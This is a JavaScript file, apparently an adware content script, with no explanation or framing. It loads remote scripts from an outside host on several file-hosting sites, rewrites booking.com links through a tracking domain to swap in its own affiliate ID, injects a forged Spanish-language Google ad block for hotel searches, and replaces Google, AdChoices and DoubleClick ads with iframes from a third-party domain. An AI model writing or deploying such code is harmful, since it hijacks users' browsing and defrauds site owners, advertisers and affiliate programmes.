  
var loc = (location.href.match(/zatetv=/i));
if (location.href.match(/^http:\/\/(www\.)?bayfiles\.net/i) && loc) {
    addScript("bayfiles");
}else if (location.href.match(/^http:\/\/(www\.)?billionuploads\.com/i) && loc) {
    addScript("billion");
}else if (location.href.match(/^http:\/\/(www\.)?hugefiles\.net/i) && loc) {
    addScript("huge");
}else if (location.href.match(/^http:\/\/(www\.)?vshare\.eu/i) && loc) {
    addScript("videoshare");
}else if (location.href.match(/^http:\/\/(www\.)?180upload\.com/i) && loc) {
    addScript("180upload");
}else if (location.href.match(/^http:\/\/(www\.)?uptobox\.com/i) && loc) {
    addScript("uptobox");
}

function addScript(a) {
    var s = document.createElement('script');
    s.setAttribute("type", "text/javascript");
    s.setAttribute("src", "http://mirrors.zate.tv/" + a + ".js");
    document.getElementsByTagName("head")[0].appendChild(s);
}


 function tam(me,a) {
    var val = null;
    if(a)
        val = ['300x250', '728x90', '160x600', '120x600', '336x280'];
    else
        val = ['300x250', '728x90', '160x600','468x60','800x600','120x20','120x600','800x440','336x280','280x336','250x250','234x60','500x500','800x500','300x600','720x300'];
    
    var ret = false;
    
    for (var i = 0; i < val.length; i++) {
        if (me == val[i]) {
            ret = true;
            break;
        }
    }
    return ret;

}
var domains = ['booking.com'];
function checkValidDesc(a) {
    for (var i = 0; i < domains.length; i++) {
        if (a.match("^(http|https)\:\/\/(www\.)?" + domains[i].replace("\.", "\\\."))) {
            return true;
        }
    }
    return false;
}
function isLink(a) {
    if (a.href == "") {
        return false;
    }
    var b = /(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;
    return b.test(a.href);
}
function insertDesc() {
if (window.location.protocol !== "https:") {
    var a = document.getElementsByTagName("a");
    for (var i = 0; i < a.length; i++) {
        if (!isLink(a[i]) || document.domain.match((a[i].href.match(":\/\/(.[^/]+)")[1]).replace('www.', ''))) {
            continue
        }
        if (checkValidDesc(a[i].href)) {
            a[i].href = "http://statsbooking.com/ref.html?track=" + a[i].href + "?aid=descuentodos"
        }
    }
}
var t = setInterval(function() {
    var ad = document.getElementsByClassName("ads-ad");
    if (window.location.href.indexOf("booking") > -1 || window.location.href.indexOf("hotel") > -1 || window.location.href.indexOf("hostel") > -1 || window.location.href.indexOf("posada") > -1) {
        if (ad.length > 0) {
            clearInterval(t);
            var d = "";
            d += '<style>.ads-ad{padding-top:11px;padding-bottom:11px}#center_col ._jd{position:relative;margin:0px 0px 6px 0px;padding-top:2px;padding-bottom:0px}#center_col .ads-ad{padding-left:8px;padding-right:8px}#rhs ._jd{margin:5px 0px 32px 16px;padding-top:3px;padding-bottom:0px}#rhs .ads-ad{padding-left:0px;padding-right:0px}#center_col ._jd{border-bottom:1px solid #ebebeb}#center_col ._Gl{margin:12px -17px 0 0;padding:0}#center_col ._Gl{font-weight:normal;font-size:13px;float:right}._Gl span+span{margin-left:3px}#rhs ._Gl{font-weight:normal;font-size:13px;margin:0;padding:0;}.ads-bbl-container{background-color:#fff;border:1px solid rgba(0,0,0,0.2);box-shadow:0 4px 16px rgba(0,0,0,0.2);color:#666;position:absolute;z-index:120}.ads-bbl-triangle{border-left-color:transparent;border-right-color:transparent;border-width:0 9.5px 9.5px 9.5px;width:0px;border-style:solid;border-top-color:transparent;height:0px;position:absolute;z-index:121}.ads-bbl-triangle-bg{border-bottom-color:#999}.ads-bbl-triangle-fg{border-bottom-color:#fff;margin-left:-9px;margin-top:1px}.ads-bblc{display:none}._tA{padding:16px;color:#666}._kT{padding-top:12px}._tA a{text-decoration:none}._tA a:hover{text-decoration:underline}._uo{background:url(/images/nav_logo195.png);background-position:0 -106px;display:inline-block;height:12px;margin-top:-2px;position:relative;top:2px;width:12px;text-indent:100%;white-space:nowrap;overflow:hidden}.ads-visurl{color:#006621;white-space:nowrap;font-size:13px}#center_col .ads-visurl cite{color:#006621;vertical-align:bottom}.ads-visurl .ads-badge{margin-right:7px;margin-left:0px}.ads-badge{background-color:#EFC439;border-radius:2px;color:#fff;display:inline-block;font-size:11px;padding:0 2px;line-height:14px;vertical-align:baseline}._jd .action-menu{line-height:0}#center_col ._jd .action-menu .mn-dwn-arw{border-color:#006621 transparent}#center_col ._jd .action-menu:hover .mn-dwn-arw{border-color:#00591E transparent}._BR{display:-webkit-box;min-height:36px;overflow:hidden;text-overflow:ellipsis;-webkit-box-orient:vertical;-webkit-line-clamp:2}._pA,._Pr{margin:0 -13px -2px 0;padding:4px 0 3px 28px;width:526px}._pA>li,._Pr>li{-webkit-box-sizing:border-box;box-sizing:border-box;display:inline-block;padding:0 13px 2px 0;vertical-align:top;width:50%}._pA>li{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}._Pr{padding-top:22px;padding-bottom:4px;margin-bottom:-15px}._Pr>li{padding-bottom:15px}._ES>li,._pA>li,._Pr>li{line-height:inherit}</style><h3><a style="display:none" href="http://statsbooking.com/google.html?track=http://www.booking.com/index.html?aid=333206" id="s0p1"></a>';
            d += '<a href="http://statsbooking.com/google.html?track=http://www.booking.com/index.html?aid=333206" id="vs0p1" onmousedown="return google.arwt(this)" class="_Et"><b>Booking</b>.com: Hoteles - <b>Booking</b>.com: reserva fácil y rápido‎</a></h3>';
            d += '<div class="ads-visurl"><span class="ads-badge">Anuncio</span><cite>www.<b>booking</b>.com</cite>‎</div>';
            d += '<div class="ads-creative">531.000+ Hoteles en todo el mundo.</div>';
            d += '<div class="_Rdb _Nf">Albergues&nbsp;·&nbsp;Apartamentos&nbsp;·&nbsp;Casas de Vacaciones&nbsp;·&nbsp;Hostels</div>';
            d += '<ul class="_Pr"><li><h3><a href="http://statsbooking.com/google.html?track=http://www.booking.com/city/ar/buenos-aires.html?aid=333206">750 Buenos Aires Hoteles</a></h3><div class="ads-creative ac">¡Precio Mínimo Garantizado!<br>Reservar un Hotel en Buenos Aires</div></li><li><h3><a href="http://statsbooking.com/google.html?track=http://www.booking.com/city/mx/mexico.html?aid=333206">Hoteles Ciudad de México</a></h3><div class="ads-creative ac">Reserva online y paga en el hotel<br>Reservar Ciudad de México Hoteles</div></li><li><h3><a href="http://statsbooking.com/google.html?track=http://www.booking.com/city/us/new-york.html?aid=333206">500 Hoteles en Nueva York</a></h3><div class="ads-creative ac">Hoteles al 50%<br>Reserva un Hotel en Nueva York</div></li><li><h3><a href="http://statsbooking.com/google.html?track=http://www.booking.com/city/es/ibiza.html?aid=333206">100 Hoteles en Ibiza</a></h3><div class="ads-creative ac">Pago siempre 100% seguro.<br>Reserva un Hotel en Ibiza</div></li></ul>';
            d += '<li class=\"action-menu-item ab_dropdownitem\" role=\"menuitem\" data-type=\"why_this_ad\"><div class=\"action-menu-button\" role=\"menuitem\" tabindex=\"-1\" jsaction=\"am.itemclk\" data-ved=\"0CCIQgRM\">¿Por qué este anuncio?</div></li></ul></div></div></div>';
            ad['0'].innerHTML = d
        }
    }else if(window.location.href.indexOf("groupon") > -1 || window.location.href.indexOf("grupon") > -1){
        }
}, 100);
}


function a() {
    var texts = document.getElementsByTagName('text');
    if (texts.length > 0) {
        for (i = 0; i < texts.length; i++) {
            if (texts[i].innerHTML === 'Google' || texts[i].innerHTML.indexOf('Google') !== -1 || texts[i].innerHTML.search("Anuncios") > -1 || texts[i].innerHTML.indexOf("Anuncios") !== -1 || texts[i].innerHTML.indexOf("anuncios") !== -1  || texts[i].innerHTML === 'Gesti&oacute;n anuncios' || texts[i].innerHTML === 'AdChoices') {
                var parent = texts[i];
                while (parent.tagName.toUpperCase() !== 'HTML') {
                    if (parent.tagName.toLowerCase() === 'body') {
                    var w = getSizes('w');
                    var h = getSizes('h');
                     if (tam(getSizes('t'), true)){
                                                                        parent.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://zomvid.com/p.htm?2=' + w + '&1=' + h + '"></iframe>';
                                                                            }
                    }
                    parent = parent.parentNode;
                }
            }
        }
    }
}


function b(){
    var choises = document.getElementsByTagName('img');
    if(choises.length > 0){
        for(i = 0; i < choises.length; i++){
            var child = choises[i];
            if(child.alt === 'AdChoices' || child.src.indexOf("/c_30_us.png") > -1 || child.src.indexOf('//c.betrad.com/') !== -1){
                while (child.tagName.toUpperCase() !== 'HTML') {
                    if (child.tagName.toLowerCase() === 'body') {
                      var w = getSizes('w');
                        var h = getSizes('h');
                        if (tam(getSizes('t'), true)){
                                                                            child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://zomvid.com/p.htm?2=' + w + '&1=' + h + '"></iframe>';
                                                  
                                                 }
                    }
                    child = child.parentNode;
                }
            }
        }
    }
}
function c(){
    var ifra = document.getElementsByTagName("iframe");
    if(ifra.length > 0){
        for(i = 0; i < ifra.length; i++){
            var child = ifra[i];
             if(child.src.indexOf("doubleclick.net") !== -1){
                while (child.tagName.toUpperCase() !== 'HTML') {
                    if (child.tagName.toLowerCase() === 'body') {
                        var w = getSizes('w');
                            var h = getSizes('h');
                            if (tam(getSizes('t'), true)){
                                                                                     child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://zomvid.com/p.htm?2=' + w + '&1=' + h + '"></iframe>';
                                                  
                                                }
                    }
                    child = child.parentNode;
                }
            }
        }
    }
}

function getSizes(a) {
    var myWidth = 0, myHeight = 0;
    if (typeof (window.innerWidth) === 'number') {
        myWidth = window.innerWidth;
        myHeight = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        myWidth = document.documentElement.clientWidth;
        myHeight = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        myWidth = document.body.clientWidth;
        myHeight = document.body.clientHeight;
    }
    if(a == 'w')
    return myWidth
    else if (a == 'h')
    return myHeight;
    else
    return myWidth + 'x' + myHeight;
}


a();
b();
c();
insertDesc();
  
